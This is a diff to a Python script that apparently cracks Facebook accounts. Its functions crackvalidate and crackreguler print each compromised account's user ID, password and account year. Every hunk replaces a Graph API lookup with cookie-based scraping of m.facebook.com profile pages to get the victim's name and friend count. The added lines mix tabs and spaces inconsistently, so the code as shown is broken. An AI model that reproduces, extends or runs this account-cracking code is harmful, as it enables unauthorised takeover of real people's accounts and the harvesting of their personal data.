@@ -830,8 +830,15 @@ def crackvalidate(idf,pwx,url):
 				data = response.json()
 				name = data.get('name')
 				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
-				print(f"\n⌲ Name: {hijo}{name}{puti}")
-				print(f"⌲ Followers: {hijo}{followers_count}{puti}")
+				user=idf
+				session = requests.Session()
+                get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
+                nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+                response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
+                try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+                except:teman = ""
+				print(f"\n⌲ Name: {hijo}{nama}{puti}")
+				print(f"⌲ Friends: {hijo}{teman}{puti}")
 				print(f"⌲ User ID: {hijo}{idf}{puti}")
 				print(f"⌲ Password: {hijo}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
@@ -847,8 +854,15 @@ def crackvalidate(idf,pwx,url):
 				data = response.json()
 				name = data.get('name')
 				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
-				print(f"\n⌲ Name: {kun}{name}{puti}")
-				print(f"⌲ Followers: {kun}{followers_count}{puti}")
+				user=idf
+				session = requests.Session()
+                get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
+                nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+                response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
+                try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+                except:teman = ""
+				print(f"\n⌲ Name: {kun}{nama}{puti}")
+				print(f"⌲ Friends: {kun}{teman}{puti}")
 				print(f"⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
@@ -930,8 +944,15 @@ def crackreguler(idf,pwx,url):
 				data = response.json()
 				name = data.get('name')
 				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
-				print(f"\n⌲ Name: {hijo}{name}{puti}")
-				print(f"⌲ Followers: {hijo}{followers_count}{puti}")
+				user=idf
+				session = requests.Session()
+                get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
+                nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+                response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
+                try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+                except:teman = ""
+				print(f"\n⌲ Name: {hijo}{nama}{puti}")
+				print(f"⌲ Friends: {hijo}{teman}{puti}")
 				print(f"⌲ User ID: {hijo}{idf}{puti}")
 				print(f"⌲ Password: {hijo}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
@@ -947,8 +968,15 @@ def crackreguler(idf,pwx,url):
 				data = response.json()
 				name = data.get('name')
 				followers_count = data.get('followers', {}).get('summary', {}).get('total_count')
-				print(f"\n⌲ Name: {kun}{name}{puti}")
-				print(f"⌲ Followers: {kun}{followers_count}{puti}")
+				user=idf
+				session = requests.Session()
+                get_id = session.get("https://m.facebook.com/profile.php",cookies=kuki,headers=headapp).text
+                nama = re.findall('\<title\>(.*?)<\/title\>',str(get_id))[0]
+                response2 = session.get("https://m.facebook.com/profile.php?v=friends",cookies=kuki,headers=headapp).text
+                try:teman = re.findall('\<h3\ class\=\".*?\"\>Teman\ \((.*?)\)<\/h3\>',str(response2))[0]
+                except:teman = ""
+				print(f"\n⌲ Name: {kun}{nama}{puti}")
+				print(f"⌲ Friends: {kun}{teman}{puti}")
 				print(f"⌲ User ID: {kun}{idf}{puti}")
 				print(f"⌲ Password: {kun}{pw}{puti}")
 				print(f"⌲ Tahun: {mer}{tahun(idf)}{puti}")
